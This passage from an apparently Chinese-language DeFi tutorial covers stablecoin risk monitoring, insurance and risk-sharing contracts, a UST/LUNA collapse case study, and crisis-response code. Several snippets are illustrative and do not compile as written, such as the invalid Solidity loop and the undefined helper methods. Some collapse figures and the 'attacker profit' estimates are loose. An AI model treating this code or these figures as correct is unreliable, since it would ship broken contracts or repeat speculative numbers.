                return self.sigmoid(output)
        
        return LSTMAnomalyDetector()
    
    def predict_attack_probability(
        self,
        historical_data: pd.DataFrame,
        current_state: Dict
    ) -> float:
        """
        预测攻击概率
        """
        # 准备时序数据
        sequence_length = 100
        features = self.extract_features(historical_data[-sequence_length:])
        features_tensor = torch.FloatTensor(features).unsqueeze(0)
        
        # 使用LSTM预测
        with torch.no_grad():
            attack_prob = self.lstm_model(features_tensor).item()
        
        # 结合当前状态调整预测
        if current_state['high_slippage_detected']:
            attack_prob *= 1.5
        if current_state['unusual_gas_price']:
            attack_prob *= 1.3
        
        return min(attack_prob, 1.0)

# 强化学习风险管理框架
class RLRiskManager:
    """
    使用强化学习动态调整协议参数
    """
    def __init__(self, protocol_params: Dict):
        self.state_dim = 10  # 状态空间维度
        self.action_dim = 5   # 动作空间维度
        self.policy_network = self._build_policy_network()
        self.value_network = self._build_value_network()
        
    def get_state(self, market_data: Dict) -> np.ndarray:
        """
        获取当前市场状态
        """
        return np.array([
            market_data['collateral_ratio'],
            market_data['utilization_rate'],
            market_data['volatility_30d'],
            market_data['liquidity_depth'],
            market_data['bad_debt_ratio'],
            market_data['oracle_deviation'],
            market_data['gas_price_gwei'],
            market_data['active_users_24h'],
            market_data['protocol_revenue_24h'],
            market_data['competitor_rates']
        ])
    
    def select_action(self, state: np.ndarray) -> Dict[str, float]:
        """
        选择最优参数调整动作
        """
        state_tensor = torch.FloatTensor(state).unsqueeze(0)
        
        with torch.no_grad():
            action_probs = self.policy_network(state_tensor)
            action = torch.multinomial(action_probs, 1).item()
        
        # 将动作映射到具体参数调整
        action_map = {
            0: {'interest_rate': 0.001, 'ltv': 0},       # 提高利率
            1: {'interest_rate': -0.001, 'ltv': 0},      # 降低利率
            2: {'interest_rate': 0, 'ltv': -0.05},       # 降低LTV
            3: {'interest_rate': 0, 'ltv': 0.05},        # 提高LTV
            4: {'interest_rate': 0, 'ltv': 0}            # 不调整
        }
        
        return action_map[action]
    
    def calculate_reward(
        self,
        old_state: np.ndarray,
        action: Dict,
        new_state: np.ndarray
    ) -> float:
        """
        计算奖励函数
        """
        # 目标：最大化协议收入，最小化坏账，保持稳定
        revenue_increase = new_state[8] - old_state[8]
        bad_debt_increase = new_state[4] - old_state[4]
        stability_score = 1 - abs(new_state[0] - 1.5)  # 目标抵押率150%
        
        reward = (
            revenue_increase * 100 -
            bad_debt_increase * 1000 +
            stability_score * 10
        )
        
        return reward
    
    def _build_policy_network(self) -> nn.Module:
        """
        构建策略网络
        """
        return nn.Sequential(
            nn.Linear(self.state_dim, 128),
            nn.ReLU(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, self.action_dim),
            nn.Softmax(dim=-1)
        )
    
    def _build_value_network(self) -> nn.Module:
        """
        构建价值网络
        """
        return nn.Sequential(
            nn.Linear(self.state_dim, 128),
            nn.ReLU(),
            nn.Linear(128, 64),
            nn.ReLU(),
            nn.Linear(64, 1)
        )

# Forta风格的实时监控Agent
class FortaMonitoringAgent:
    def __init__(self, protocol_address: str):
        self.protocol = protocol_address
        self.anomaly_detector = DeFiAnomalyDetector()
        self.alert_threshold = 0.8
        
    async def handle_transaction(self, tx_event) -> List[Dict]:
        findings = []
        
        # 检查大额提款
        if self._is_large_withdrawal(tx_event):
            findings.append({
                'severity': 'HIGH',
                'type': 'LARGE_WITHDRAWAL',
                'metadata': {
                    'amount': tx_event.transaction.value,
                    'from': tx_event.transaction.from_,
                    'anomaly_score': self._calculate_anomaly_score(tx_event)
                }
            })
        
        # 检查价格操纵
        if self._is_price_manipulation(tx_event):
            findings.append({
                'severity': 'CRITICAL',
                'type': 'PRICE_MANIPULATION',
                'metadata': {
                    'price_impact': self._calculate_price_impact(tx_event),
                    'affected_pools': self._get_affected_pools(tx_event)
                }
            })
        
        return findings
    
    def _calculate_anomaly_score(self, tx_event) -> float:
        # 使用ML模型计算异常分数
        features = self._extract_tx_features(tx_event)
        score = self.anomaly_detector.predict_attack_probability(
            historical_data=self._get_recent_txs(),
            current_state={'tx_event': tx_event}
        )
        return score</code></pre>
            </div>
        </div>
        
        <h4>10.3.3 保险基金与风险共担</h4>
        
        <div class="practice-section">
            <div class="code-block">
                <div class="code-header">
                    Solidity 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-solidity">// 保险基金管理
contract InsuranceFund {
    uint256 public fundBalance;
    uint256 public totalCoverage;
    
    // 风险等级定价
    mapping(uint256 => uint256) public premiumRates; // 基点
    
    struct Policy {
        address holder;
        uint256 coverage;
        uint256 premium;
        uint256 expiry;
        uint256 deductible;
    }
    
    mapping(uint256 => Policy) public policies;
    uint256 public policyCounter;
    
    // 购买保险
    function purchaseInsurance(
        uint256 coverage,
        uint256 duration,
        uint256 riskLevel
    ) external payable returns (uint256) {
        require(coverage > 0 && duration > 0, "Invalid parameters");
        
        // 计算保费
        uint256 premium = calculatePremium(coverage, duration, riskLevel);
        require(msg.value >= premium, "Insufficient premium");
        
        // 创建保单
        uint256 policyId = policyCounter++;
        policies[policyId] = Policy({
            holder: msg.sender,
            coverage: coverage,
            premium: premium,
            expiry: block.timestamp + duration,
            deductible: coverage / 10  // 10%免赔额
        });
        
        fundBalance += premium;
        totalCoverage += coverage;
        
        emit PolicyCreated(policyId, msg.sender, coverage, premium);
        return policyId;
    }
    
    function calculatePremium(
        uint256 coverage,
        uint256 duration,
        uint256 riskLevel
    ) public view returns (uint256) {
        // 基础费率
        uint256 baseRate = premiumRates[riskLevel];
        
        // 时间因子
        uint256 timeFactor = duration / 30 days;
        
        // 规模折扣
        uint256 sizeFactor = 10000;
        if (coverage > 1000000 * 1e18) {
            sizeFactor = 9000; // 10%折扣
        }
        
        // 基金充足率调整
        uint256 fundRatio = (fundBalance * 10000) / totalCoverage;
        uint256 ratioFactor = 10000;
        if (fundRatio < 2000) { // 充足率<20%
            ratioFactor = 12000; // 加价20%
        } else if (fundRatio > 5000) { // 充足率>50%
            ratioFactor = 8000; // 折扣20%
        }
        
        return (coverage * baseRate * timeFactor * sizeFactor * ratioFactor) 
            / (10000 * 10000 * 10000);
    }
    
    // 理赔
    function claim(uint256 policyId, uint256 lossAmount) external {
        Policy storage policy = policies[policyId];
        require(policy.holder == msg.sender, "Not policy holder");
        require(block.timestamp < policy.expiry, "Policy expired");
        require(lossAmount > policy.deductible, "Below deductible");
        
        // 计算赔付金额
        uint256 claimAmount = min(
            lossAmount - policy.deductible,
            policy.coverage - policy.deductible
        );
        
        require(fundBalance >= claimAmount, "Insufficient fund");
        
        // 执行赔付
        fundBalance -= claimAmount;
        totalCoverage -= policy.coverage;
        
        payable(msg.sender).transfer(claimAmount);
        
        // 作废保单
        delete policies[policyId];
        
        emit ClaimPaid(policyId, claimAmount);
    }
}

// 风险共担池
contract RiskSharingPool {
    struct Participant {
        uint256 stake;
        uint256 shares;
        uint256 lastClaimTime;
        uint256 claimCount;
    }
    
    mapping(address => Participant) public participants;
    uint256 public totalStake;
    uint256 public totalShares;
    
    // 加入风险池
    function joinPool() external payable {
        require(msg.value >= 1000 * 1e18, "Minimum stake required");
        
        Participant storage p = participants[msg.sender];
        p.stake += msg.value;
        
        // 计算份额（考虑加入时间的激励）
        uint256 newShares = msg.value;
        if (p.lastClaimTime == 0) {
            newShares = (newShares * 110) / 100; // 新用户10%奖励
        }
        
        p.shares += newShares;
        totalStake += msg.value;
        totalShares += newShares;
    }
    
    // 风险事件赔付
    function compensateVictims(
        address[] calldata victims,
        uint256[] calldata amounts
    ) external onlyRole(OPERATOR_ROLE) {
        require(victims.length == amounts.length, "Length mismatch");
        
        uint256 totalCompensation = 0;
        for (uint256 i = 0; i < amounts.length; i++) {
            totalCompensation += amounts[i];
        }
        
        require(totalCompensation <= totalStake / 2, "Compensation too large");
        
        // 按份额分摊损失
        for (uint256 i = 0; i < victims.length; i++) {
            Participant storage victim = participants[victims[i]];
            
            // 优先从自己的质押中扣除
            uint256 selfCover = min(amounts[i] / 2, victim.stake);
            victim.stake -= selfCover;
            
            // 剩余部分由池子承担
            uint256 poolCover = amounts[i] - selfCover;
            
            // 更新所有参与者的份额
            for (address participant in getAllParticipants()) {
                if (participant != victims[i]) {
                    Participant storage p = participants[participant];
                    uint256 loss = (poolCover * p.shares) / totalShares;
                    p.stake = p.stake > loss ? p.stake - loss : 0;
                }
            }
            
            payable(victims[i]).transfer(amounts[i]);
        }
        
        emit CompensationPaid(victims, amounts);
    }
}</code></pre>
                </div>
            </div>
        </div>

        <h3 id="case-studies">10.4 实际案例分析</h3>
        
        <div class="case-study">
            <h4>10.4.1 UST/LUNA崩溃事件复盘</h4>
            
            <div class="timeline">
                <p><strong>2022年5月7日</strong>：UST首次显著脱钅至0.985美元</p>
                <p><strong>5月8日</strong>：LFG（Luna Foundation Guard）部署价值15亿美元的BTC储备</p>
                <p><strong>5月9日</strong>：UST跌至0.65美元，LUNA从80美元跌至30美元</p>
                <p><strong>5月12日</strong>：UST跌至0.10美元，LUNA跌至0.0001美元，市值蒸发600亿美元</p>
            </div>
            
            <div class="code-block">
                <div class="code-header">
                    Python 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python"># UST崩溃过程数学分析
import numpy as np
import matplotlib.pyplot as plt
from datetime import datetime, timedelta

class USTCollapseAnalysis:
    def __init__(self):
        # 初始参数（基于真实数据）
        self.initial_ust_supply = 18.5e9  # 185亿 UST
        self.initial_luna_price = 80      # $80
        self.initial_luna_supply = 350e6  # 3.5亿 LUNA
        self.btc_reserves = 3.5e9         # 35亿美元BTC储备
        
    def analyze_attack_vectors(self):
        """
        分析攻击向量
        """
        attack_vectors = {
            'curve_pool_drain': {
                'description': 'Curve 3pool大量抛售UST',
                'impact': '1.5亿美元抛压',
                'timing': '5月7日',
                'attacker_cost': '10M USD',
                'profit_potential': '800M USD'
            },
            'anchor_protocol_withdrawal': {
                'description': 'Anchor协议大规模提款',
                'impact': '20亿美元资金外流',
                'timing': '5月8-9日',
                'panic_multiplier': 3.5
            },
            'social_media_fud': {
                'description': '社交媒体恐慌传播',
                'impact': '加速银行挤兑',
                'timing': '全程',
                'effectiveness': 0.85
            }
        }
        return attack_vectors
    
    def simulate_death_spiral_stages(self):
        """
        模拟死亡螺旋的各个阶段
        """
        stages = []
        
        # 阶段1: 初始脱钅
        stage1 = {
            'name': 'Initial Depeg',
            'ust_price': 0.985,
            'luna_price': 75,
            'mechanism': 'Arbitrage starts',
            'ust_burned': 500e6,  # 5亿 UST
            'luna_minted': self._calculate_luna_mint(500e6, 0.985, 75)
        }
        stages.append(stage1)
        
        # 阶段2: 恐慌加剧
        stage2 = {
            'name': 'Panic Acceleration',
            'ust_price': 0.85,
            'luna_price': 40,
            'mechanism': 'Bank run + Arbitrage',
            'ust_burned': 3e9,  # 30亿 UST
            'luna_minted': self._calculate_luna_mint(3e9, 0.85, 40)
        }
        stages.append(stage2)
        
        # 阶段3: 完全崩溃
        stage3 = {
            'name': 'Complete Collapse',
            'ust_price': 0.10,
            'luna_price': 0.0001,
            'mechanism': 'Hyperinflation',
            'ust_burned': 10e9,  # 100亿 UST
            'luna_minted': self._calculate_luna_mint(10e9, 0.10, 0.0001)
        }
        stages.append(stage3)
        
        return stages
    
    def _calculate_luna_mint(self, ust_burned, ust_price, luna_price):
        """
        计算LUNA铸造量
        """
        return (ust_burned * ust_price) / luna_price
    
    def analyze_defense_failures(self):
        """
        分析防御失败原因
        """
        failures = {
            'btc_reserve_insufficient': {
                'issue': 'BTC储备不足',
                'detail': '35亿美元对比185亿 UST供应',
                'coverage_ratio': 0.19
            },
            'mint_burn_mechanism': {
                'issue': '铸造/燃烧机制放大死亡螺旋',
                'detail': 'LUNA超发导致价格归零',
                'inflation_rate': '6.5万亿LUNA/周'
            },
            'anchor_dependency': {
                'issue': '过度依赖Anchor协议',
                'detail': '70%的UST存在Anchor',
                'vulnerability': '单点失败'
            }
        }
        return failures
    
    def calculate_attacker_profit(self):
        """
        计算攻击者收益
        """
        # 假设攻击者策略
        strategies = {
            'short_luna': {
                'position_size': 100e6,  # 1亿美元空头
                'entry_price': 80,
                'exit_price': 0.1,
                'profit': 100e6 * (1 - 0.1/80)
            },
            'ust_arbitrage': {
                'capital': 50e6,
                'rounds': 20,
                'avg_profit_per_round': 0.05,
                'total_profit': 50e6 * (1.05**20 - 1)
            },
            'curve_manipulation': {
                'cost': 10e6,
                'market_impact_profit': 200e6
            }
        }
        
        total_profit = sum(s.get('profit', s.get('total_profit', 0)) 
                          for s in strategies.values())
        
        return strategies, total_profit

# 执行分析
analysis = USTCollapseAnalysis()
attack_vectors = analysis.analyze_attack_vectors()
stages = analysis.simulate_death_spiral_stages()
failures = analysis.analyze_defense_failures()
strategies, total_profit = analysis.calculate_attacker_profit()

print("\nUST崩溃关键数据:")
print(f"\u603b损失: ~$60B")
print(f"\u6301续时间: 5天")
print(f"\u4f30计攻击者收益: ${total_profit/1e9:.1f}B")

print("\n\u6559训:")
for key, failure in failures.items():
    print(f"- {failure['issue']}: {failure['detail']}")</code></pre>
                </div>
            </div>
        </div>
        
        <div class="case-study">
            <h4>10.4.2 各大稳定币防御机制对比</h4>
            
            <table class="comparison-table">
                <thead>
                    <tr>
                        <th>稳定币</th>
                        <th>防御机制</th>
                        <th>优点</th>
                        <th>缺点</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><strong>DAI (MakerDAO)</strong></td>
                        <td>
                            <ul>
                                <li>超额抵押 (150%+)</li>
                                <li>多抵押品类型</li>
                                <li>紧急关闭机制</li>
                                <li>PSM稳定模块</li>
                            </ul>
                        </td>
                        <td>成熟稳健，经受过多次压力测试</td>
                        <td>资本效率低，依赖中心化稳定币</td>
                    </tr>
                    <tr>
                        <td><strong>FRAX</strong></td>
                        <td>
                            <ul>
                                <li>部分抵押模式</li>
                                <li>AMO算法市场操作</li>
                                <li>动态抵押率</li>
                            </ul>
                        </td>
                        <td>资本效率高，灵活性强</td>
                        <td>复杂度高，潜在算法风险</td>
                    </tr>
                    <tr>
                        <td><strong>crvUSD</strong></td>
                        <td>
                            <ul>
                                <li>LLAMMA软清算</li>
                                <li>自动做市商</li>
                                <li>动态借贷利率</li>
                            </ul>
                        </td>
                        <td>避免硬清算，用户体验好</td>
                        <td>机制复杂，需要更多时间验证</td>
                    </tr>
                    <tr>
                        <td><strong>GHO (Aave)</strong></td>
                        <td>
                            <ul>
                                <li>与Aave生态整合</li>
                                <li>Facilitator模式</li>
                                <li>Safety Module</li>
                            </ul>
                        </td>
                        <td>利用成熟DeFi基础设施</td>
                        <td>相对较新，采用率有待提升</td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <h3 id="crisis-response">10.4 危机响应与恢复</h3>
        
        <div class="theory-section">
            <h4>10.4.0 真实案例分析</h4>
            
            <h5>UST/LUNA崩溃事件复盘（2022年5月）</h5>
            
            <div class="case-study-box">
                <h6>时间线与关键事件</h6>
                <ul>
                    <li><strong>5月7日</strong>：大额UST从Anchor提取，开始脱锚</li>
                    <li><strong>5月8日</strong>：LFG动用BTC储备试图稳定价格</li>
                    <li><strong>5月9日</strong>：死亡螺旋加速，LUNA价格暴跌</li>
                    <li><strong>5月10日</strong>：Terra链暂停出块</li>
                    <li><strong>5月12日</strong>：UST跌至$0.10，系统完全崩溃</li>
                </ul>
                
                <h6>失败原因分析</h6>
                <ul>
                    <li><strong>内生抵押品</strong>：LUNA作为抵押品与UST高度相关</li>
                    <li><strong>正反馈循环</strong>：赎回机制加速了崩溃</li>
                    <li><strong>流动性不足</strong>：BTC储备无法应对抛售压力</li>
                    <li><strong>信心崩塌</strong>：Anchor高收益不可持续</li>
                </ul>
            </div>
            
            <h5>Ethena (USDe) 风险管理创新（2024）</h5>
            
            <div class="info-box">
                <h6>Delta中性对冲模型</h6>
                <ul>
                    <li><strong>永续合约对冲</strong>：质押ETH同时做空等值永续合约</li>
                    <li><strong>资金费率收益</strong>：正向市场中收取资金费率</li>
                    <li><strong>保险基金</strong>：应对负资金费率期间</li>
                    <li><strong>多交易所分散</strong>：降低对手方风险</li>
                </ul>
                
                <h6>新型风险</h6>
                <ul>
                    <li><strong>资金费率风险</strong>：长期负费率可能耗尽保险基金</li>
                    <li><strong>基差风险</strong>：现货与期货价格偏离</li>
                    <li><strong>交易所风险</strong>：CEX破产或冻结资金</li>
                </ul>
            </div>
            
            <h5>Frax V3 完全抵押化转型（2023-2024）</h5>
            
            <div class="theory-box">
                <h6>从部分抵押到完全抵押</h6>
                <p>Frax从算法稳定币向完全抵押模型的演进，展示了协议的适应性：</p>
                
                <ul>
                    <li><strong>AMO（算法市场操作）</strong>：程序化管理流动性和稳定性</li>
                    <li><strong>sFRAX收益分配</strong>：质押FRAX获得协议收益</li>
                    <li><strong>frxETH集成</strong>：利用LSD增加收益</li>
                    <li><strong>治理最小化</strong>：减少人为干预风险</li>
                </ul>
                
                <p><strong>关键教训</strong>：灵活的架构设计允许协议根据市场条件演化，而不是固守原始设计。</p>
            </div>
            
            <div class="code-section">
                <div class="code-header" onclick="toggleCode(this)">
                    <span>▶ Python: 稳定币危机预警系统</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-python">import numpy as np
from typing import Dict, List, Tuple
import pandas as pd
from dataclasses import dataclass
from enum import Enum

class CrisisLevel(Enum):
    NORMAL = 0
    CAUTION = 1
    WARNING = 2
    DANGER = 3
    CRITICAL = 4

@dataclass
class CrisisIndicator:
    name: str
    current_value: float
    threshold: float
    weight: float
    
    @property
    def severity(self) -> float:
        if self.current_value < self.threshold:
            return 0
        return min(1.0, (self.current_value - self.threshold) / self.threshold)

class StablecoinCrisisDetector:
    """稳定币危机早期预警系统"""
    
    def __init__(self):
        self.indicators = self._initialize_indicators()
        self.historical_data = []
        
    def _initialize_indicators(self) -> List[CrisisIndicator]:
        """初始化监控指标"""
        return [
            # 价格指标
            CrisisIndicator("price_deviation", 0, 0.02, 0.25),      # 2%脱锚
            CrisisIndicator("price_volatility", 0, 0.05, 0.15),     # 5%波动率
            
            # 流动性指标
            CrisisIndicator("liquidity_ratio", 0, 0.3, 0.20),       # 流动性<30%
            CrisisIndicator("withdrawal_rate", 0, 0.1, 0.15),       # 10%日提取率
            
            # 抵押品指标
            CrisisIndicator("collateral_ratio", 0, 1.2, 0.15),      # <120%抵押率
            CrisisIndicator("collateral_volatility", 0, 0.3, 0.10), # 30%抵押品波动
            
            # 治理代币指标
            CrisisIndicator("governance_price_drop", 0, 0.3, 0.10), # 30%价格下跌
            CrisisIndicator("governance_concentration", 0, 0.5, 0.05) # 50%集中度
        ]
    
    def update_indicators(self, market_data: Dict[str, float]):
        """更新指标数值"""
        for indicator in self.indicators:
            if indicator.name in market_data:
                indicator.current_value = market_data[indicator.name]
    
    def calculate_crisis_score(self) -> Tuple[float, CrisisLevel]:
        """计算综合危机评分"""
        total_score = 0
        total_weight = 0
        
        for indicator in self.indicators:
            score = indicator.severity * indicator.weight
            total_score += score
            total_weight += indicator.weight
        
        normalized_score = total_score / total_weight if total_weight > 0 else 0
        
        # 映射到危机等级
        if normalized_score < 0.2:
            level = CrisisLevel.NORMAL
        elif normalized_score < 0.4:
            level = CrisisLevel.CAUTION
        elif normalized_score < 0.6:
            level = CrisisLevel.WARNING
        elif normalized_score < 0.8:
            level = CrisisLevel.DANGER
        else:
            level = CrisisLevel.CRITICAL
        
        return normalized_score, level
    
    def generate_response_plan(self, level: CrisisLevel) -> Dict[str, List[str]]:
        """生成应对方案"""
        response_plans = {
            CrisisLevel.NORMAL: {
                "monitoring": ["继续常规监控"],
                "actions": ["维持正常运营"],
                "communication": ["定期报告"]
            },
            CrisisLevel.CAUTION: {
                "monitoring": ["提高监控频率至每小时"],
                "actions": ["准备流动性储备", "检查系统参数"],
                "communication": ["内部团队警报"]
            },
            CrisisLevel.WARNING: {
                "monitoring": ["实时监控所有指标"],
                "actions": [
                    "激活应急流动性",
                    "调整风险参数",
                    "暂停高风险操作"
                ],
                "communication": ["公开声明", "社区更新"]
            },
            CrisisLevel.DANGER: {
                "monitoring": ["24/7危机监控室"],
                "actions": [
                    "实施熔断机制",
                    "动员所有储备",
                    "限制大额提取",
                    "紧急参数调整"
                ],
                "communication": ["紧急公告", "与监管机构沟通"]
            },
            CrisisLevel.CRITICAL: {
                "monitoring": ["全系统紧急状态"],
                "actions": [
                    "激活紧急关闭",
                    "冻结所有操作",
                    "启动恢复计划",
                    "保护用户资产"
                ],
                "communication": ["危机公关", "法律团队介入"]
            }
        }
        
        return response_plans.get(level, response_plans[CrisisLevel.NORMAL])
    
    def simulate_ust_collapse(self) -> pd.DataFrame:
        """模拟UST崩溃场景"""
        timeline = []
        
        # 初始状态
        state = {
            "day": 0,
            "ust_price": 1.0,
            "luna_price": 80,
            "luna_supply": 350_000_000,
            "ust_supply": 18_000_000_000,
            "anchor_tvl": 14_000_000_000,
            "btc_reserve": 3_500_000_000
        }
        
        # 模拟10天的崩溃过程
        for day in range(10):
            # 触发事件
            if day == 2:  # 大额提取
                state["anchor_tvl"] *= 0.7
                state["ust_price"] = 0.98
            
            if day >= 3:  # 死亡螺旋
                # UST赎回压力
                redemption_rate = max(0, (1 - state["ust_price"]) * 0.5)
                state["ust_supply"] *= (1 - redemption_rate)
                
                # LUNA增发
                luna_mint = redemption_rate * state["ust_supply"] / state["luna_price"]
                state["luna_supply"] += luna_mint
                
                # LUNA价格压力
                supply_impact = luna_mint / state["luna_supply"]
                state["luna_price"] *= (1 - supply_impact * 2)
                
                # UST价格更新
                confidence = state["luna_price"] * state["luna_supply"] / state["ust_supply"]
                state["ust_price"] = min(1, confidence / 20)
                
                # BTC储备消耗
                if state["btc_reserve"] > 0:
                    defense_spend = min(state["btc_reserve"], 500_000_000)
                    state["btc_reserve"] -= defense_spend
                    state["ust_price"] += defense_spend / state["ust_supply"] * 0.1
            
            timeline.append(state.copy())
            state["day"] = day + 1
        
        return pd.DataFrame(timeline)

# 使用示例
detector = StablecoinCrisisDetector()

# 更新市场数据
market_data = {
    "price_deviation": 0.025,      # 2.5%脱锚
    "price_volatility": 0.08,      # 8%波动率
    "liquidity_ratio": 0.25,       # 25%流动性
    "withdrawal_rate": 0.15,       # 15%日提取
    "collateral_ratio": 1.15,      # 115%抵押率
    "collateral_volatility": 0.35, # 35%波动
    "governance_price_drop": 0.4,  # 40%下跌
    "governance_concentration": 0.3 # 30%集中度
}

detector.update_indicators(market_data)
score, level = detector.calculate_crisis_score()
response = detector.generate_response_plan(level)

print(f"危机评分: {score:.2f}")
print(f"危机等级: {level.name}")
print(f"应对方案: {response}")

# 模拟UST崩溃
collapse_data = detector.simulate_ust_collapse()
print("\nUST崩溃模拟:")
print(collapse_data[["day", "ust_price", "luna_price", "luna_supply", "btc_reserve"]])</code></pre>
                </div>
            </div>
            
            <h4>10.4.1 应急响应框架</h4>
            
            <div class="code-block">
                <div class="code-header">
                    TypeScript 代码 <span class="toggle-icon">▼</span>
                </div>
                <div class="code-content" style="display: none;">
                    <pre><code class="language-typescript">// 危机响应系统
interface CrisisLevel {
    level: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
    triggers: string[];
    actions: string[];
    authority: string[];
}

class CrisisResponseSystem {
    private crisisLevels: Map<string, CrisisLevel> = new Map();
    private currentLevel: string = 'LOW';
    private responseTeam: string[] = [];
    
    constructor() {
        this.initializeCrisisLevels();
    }
    
    private initializeCrisisLevels() {
        // 低级危机
        this.crisisLevels.set('LOW', {
            level: 'LOW',
            triggers: [
                'Price deviation > 3%',
                'Unusual trading volume',
                'Minor smart contract bug'
            ],
            actions: [
                'Monitor closely',
                'Alert core team',
                'Prepare response plan'
            ],
            authority: ['monitoring_team']
        });
        
        // 中级危机
        this.crisisLevels.set('MEDIUM', {
            level: 'MEDIUM',
            triggers: [
                'Price deviation > 5%',
                'Liquidity drop > 20%',
                'Governance attack attempt'
            ],
            actions: [
                'Activate defense mechanisms',
                'Limit transaction sizes',
                'Increase collateral requirements'
            ],
            authority: ['core_team', 'security_team']
        });
        
        // 高级危机
        this.crisisLevels.set('HIGH', {
            level: 'HIGH',
            triggers: [
                'Price deviation > 10%',
                'Bank run detected',
                'Critical vulnerability found'
            ],
            actions: [
                'Pause non-essential functions',
                'Activate insurance fund',
                'Emergency governance vote'
            ],
            authority: ['emergency_council', 'multisig_signers']
        });
        
        // 关键危机
        this.crisisLevels.set('CRITICAL', {
            level: 'CRITICAL',
            triggers: [
                'System compromise',
                'Complete depeg',
                'Catastrophic loss'
            ],
            actions: [
                'Full system pause',
                'Asset recovery mode',
                'Legal team activation',
                'Public communication'
            ],
            authority: ['founder_keys', 'legal_team']
        });
    }
    
    async detectCrisis(metrics: SystemMetrics): Promise<CrisisLevel | null> {
        // 检查各级触发条件
        for (const [levelName, level] of this.crisisLevels) {
            for (const trigger of level.triggers) {
                if (await this.evaluateTrigger(trigger, metrics)) {
                    return level;
                }
            }
        }
        return null;
    }
    
    async respondToCrisis(crisis: CrisisLevel) {
        console.log(`Crisis detected: ${crisis.level}`);
        
        // 执行响应动作
        for (const action of crisis.actions) {
            await this.executeAction(action);
        }
        
        // 通知相关方
        await this.notifyStakeholders(crisis);
        
        // 启动恢复计划
        if (crisis.level === 'HIGH' || crisis.level === 'CRITICAL') {
            await this.initiateRecoveryPlan();
        }
    }
    
    private async executeAction(action: string) {
        const actionMap: { [key: string]: () => Promise<void> } = {
            'Pause non-essential functions': async () => {
                await this.pauseContracts(['swap', 'lend', 'stake']);
            },
            'Activate insurance fund': async () => {
                await this.activateInsurance();
            },
            'Full system pause': async () => {
                await this.emergencyPause();
            },
            'Asset recovery mode': async () => {
                await this.enableRecoveryMode();
            }
        };
        
        const actionFunction = actionMap[action];
        if (actionFunction) {
            await actionFunction();
        }
    }
    
    private async initiateRecoveryPlan() {
        const recoverySteps = [
            'Assess damage',
            'Secure remaining assets',
            'Calculate user balances',
            'Prepare compensation plan',
            'Deploy recovery contracts',
            'Enable gradual withdrawal',
            'Monitor recovery progress'
        ];
        
        for (const step of recoverySteps) {
            console.log(`Executing recovery step: ${step}`);
            await this.executeRecoveryStep(step);
        }
    }
}

// 事后分析框架
class PostMortemAnalysis {
    async analyzeIncident(incidentId: string): Promise<IncidentReport> {
        const incident = await this.loadIncidentData(incidentId);
        
        return {
            summary: this.generateSummary(incident),
            timeline: this.constructTimeline(incident),
            rootCause: await this.identifyRootCause(incident),
            impact: this.assessImpact(incident),
            lessons: this.extractLessons(incident),
            improvements: this.recommendImprovements(incident)
        };
    }
    
    private async identifyRootCause(incident: IncidentData): Promise<RootCause> {
        // 5 Whys分析法
        const whys: string[] = [];
        let currentIssue = incident.initialIssue;
        
        for (let i = 0; i < 5; i++) {
            const why = await this.askWhy(currentIssue);
            whys.push(why);
            currentIssue = why;
            
            // 如果找到根本原因，提前结束
            if (this.isRootCause(why)) {
                break;
            }
        }
        
        return {
            issue: incident.initialIssue,
            whys: whys,
            rootCause: whys[whys.length - 1],
            category: this.categorizeRootCause(whys[whys.length - 1])
        };
    }
    
    private recommendImprovements(incident: IncidentData): Improvement[] {
        const improvements: Improvement[] = [];
        
        // 技术改进
        if (incident.category === 'technical') {
            improvements.push({
                area: 'Smart Contract',
                recommendation: 'Implement additional validation checks',
                priority: 'HIGH',
                effort: 'MEDIUM'
            });
        }
        
        // 流程改进
        improvements.push({
            area: 'Monitoring',
            recommendation: 'Add real-time alerts for similar patterns',
            priority: 'HIGH',
            effort: 'LOW'
        });
        
        // 治理改进
        if (incident.severity === 'HIGH') {
            improvements.push({
                area: 'Governance',
                recommendation: 'Review and update emergency procedures',
                priority: 'MEDIUM',
                effort: 'MEDIUM'
            });
        }
        
        return improvements;
    }
}</code></pre>
                </div>
            </div>
        </div>

        <div class="exercise">
            <div class="exercise-header">
                <span class="exercise-icon">💻</span>
                <h4>练习10.1：设计防御银行挤兑的机制</h4>
            </div>
            <p>设计一个稳定币系统，实现以下防御银行挤兑的功能：</p>
            <ol>
                <li>动态提款限制（基于系统健康度）</li>
                <li>提款排队机制</li>
                <li>激励长期持有的奖励系统</li>
                <li>紧急情况下的部分赎回机制</li>
                <li>流动性提供者保护</li>
            </ol>
            
            <button class="answer-toggle" onclick="toggleAnswer(this)">查看参考答案</button>
            <div class="answer-content">
                <div class="code-block">
                    <div class="code-header">
                        <span class="code-language">solidity</span>
                    </div>
                    <div class="code-content">
                        <pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract BankRunDefenseSystem {
    // 系统状态
    enum SystemHealth { HEALTHY, STRESSED, CRITICAL }
    SystemHealth public systemHealth = SystemHealth.HEALTHY;
    
    // 用户数据
    struct UserData {
        uint256 balance;
        uint256 lockedBalance;
        uint256 lastWithdrawTime;
        uint256 loyaltyPoints;
        bool isLiquidityProvider;
    }
    
    mapping(address => UserData) public users;
    
    // 提款队列
    struct WithdrawRequest {
        address user;
        uint256 amount;
        uint256 requestTime;
        uint256 executeTime;
        bool processed;
    }
    
    WithdrawRequest[] public withdrawQueue;
    mapping(address => uint256) public pendingWithdrawals;
    
    // 系统参数
    uint256 public totalDeposits;
    uint256 public totalReserves;
    uint256 public dailyWithdrawLimit;
    uint256 public queueDelay = 24 hours;
    
    // 动态限制参数
    uint256 public baseWithdrawRate = 1000; // 10%
    uint256 public stressedWithdrawRate = 500; // 5%
    uint256 public criticalWithdrawRate = 200; // 2%
    
    // 忠诚度奖励
    uint256 public constant LOYALTY_BONUS_RATE = 10; // 0.1% per day
    uint256 public constant LP_PROTECTION_MULTIPLIER = 2;
    
    // 事件
    event WithdrawRequested(address user, uint256 amount, uint256 executeTime);
    event WithdrawProcessed(address user, uint256 amount);
